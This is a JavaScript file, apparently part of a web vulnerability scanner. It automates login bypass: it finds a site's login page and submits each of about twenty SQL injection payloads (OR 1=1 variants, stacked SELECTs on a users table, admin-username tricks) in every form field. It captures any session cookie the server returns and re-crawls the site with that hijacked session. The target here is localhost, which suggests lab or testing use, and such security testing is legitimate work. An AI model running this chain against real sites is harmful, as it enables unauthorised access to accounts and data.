const axios = require('axios');
const { getData } = require('./sqliUtils');
const scrape = require('../puppeteerUtils');

async function sendSQLiPostRequest(url, formDataNames) {
    console.log("URL:", url);
    const sqliPayloads = [
        '\'; SELECT * FROM users LIMIT 0, 1 -- ',
        '"; SELECT * FROM users LIMIT 0, 1 -- ',
        '\'); SELECT * FROM users LIMIT 0, 1 -- ',
        '"); SELECT * FROM users LIMIT 0, 1 -- ',
        '\' OR 1=1 -- ',
        '\') OR 1=1 -- ',
        '") OR 1=1 -- ',
        '" OR 1=1 -- ',
        '\' || 1=\'1',
        '" || 1="1',
        '") || 1=")1',
        '\') || 1=\')1',
        '\' || username="admin" -- ',
        '\') || username="admin" -- ',
        '") || username="admin" -- ',
        '" || username="admin" -- ',
        '\' || 1=1 # ',
        '" || 1=1 # ',
        '") || 1=1 # ',
        '\') || 1= 1 # ',
    ];

    for (const sqliPayload of sqliPayloads) {
        try {
            const formData = new URLSearchParams();
            formDataNames.forEach((name) => {
                if (name !== undefined && !formData.has(name)) {
                    formData.append(name, sqliPayload);
                }
            });

            console.log(formData);
            const cookie = "PHPSESSID=IamCookie;";
            const headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': cookie,
            };
            const proxyAgent = 'http://0.0.0.0:1234';
            const response = await axios.post(url, formData.toString(), { headers, proxy: { host: proxyAgent, port: 1234 } });
            const responseBody = response.data;
            console.log(responseBody);

            const cookies = {};
            const cookieRegex = /(?:PHPSESSID|JSESSIONID|ASP.NET_SessionId|sessionid|rails_session|connect.sid|sid|Token|AuthCookie)=([^;]+)/gi;
            const responseCookies = response.headers['set-cookie'];
            console.log(responseCookies);

            if (responseCookies) {
                const cookieMatches = responseCookies.match(cookieRegex);
                console.log('Cookie Matches:', cookieMatches);
                if (cookieMatches) {
                    cookieMatches.forEach((cookieStr) => {
                        const [cookieName, cookieValue] = cookieStr.split('=');
                        if (cookieName && cookieValue && cookieValue !== cookie) {
                            cookies[cookieName.trim()] = cookieValue.trim();
                        }
                    });
                }
            }

            if (Object.keys(cookies).length > 0) {
                return { cookie: cookies };
            }
        } catch (error) {
            console.error('Error sending POST request:', error);
        }
    }

    return false;
}

const chainAll = async (scanResult, url) => {
    const urls = Object.keys(global.scrapedData);
    const loginUrls = urls.filter(urlValue => /\/login(?:\.\w+)?$/.test(urlValue));
    let sessionCookie;

    try {
        if (loginUrls.length > 0) {
            const htmlResponse = await axios.get(loginUrls[0]);
            const htmlContent = htmlResponse.data;
            console.log(htmlContent);
            const { queryParams, formDataNames } = await getData(htmlContent);
            sessionCookie = (await sendSQLiPostRequest(loginUrls[0], formDataNames)).cookie;
            const sessionKey = Object.keys(sessionCookie)[0];
            global.scrapedData = await scrape(url, { session: { sessionKey: sessionKey, sessionValue: sessionCookie[sessionKey] } });
        }

        // // Check for path traversal
        // scanResult['pathTraversal'] = await pathTraversalCheck(url);

        // // Check for SQLi vulnerability
        // scanResult['SQLi'] = await checkSQLi(url);
    } catch (error) {
        console.error('Error:', error);
        return { error: "Internal Server Error" };
    }
}

(async () => {
    global.scrapedData = await scrape('http://localhost:8080');
    await chainAll({}, 'http://localhost:8080');
})();

module.exports = chainAll;
